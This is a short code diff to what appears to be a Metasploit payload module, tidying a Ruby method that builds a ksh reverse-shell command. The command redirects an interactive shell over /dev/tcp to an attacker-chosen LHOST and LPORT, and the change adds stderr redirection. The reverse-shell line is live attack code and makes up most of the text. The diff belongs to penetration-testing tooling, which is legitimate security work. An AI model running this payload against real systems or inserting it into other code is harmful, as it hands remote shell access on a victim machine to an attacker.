@@ -34,11 +34,10 @@ module MetasploitModule
   end
 
   def generate
-    return super + command_string
+    super + command_string
   end
 
   def command_string
-    # ksh -c 'ksh >/dev/tcp/${HOST}/${PORT} <&1'
-    cmd = "ksh -c 'ksh >/dev/tcp/#{datastore['LHOST']}/#{datastore['LPORT']} <&1'"
+    "ksh -c 'ksh >/dev/tcp/#{datastore['LHOST']}/#{datastore['LPORT']} 2>&1 <&1'"
   end
 end
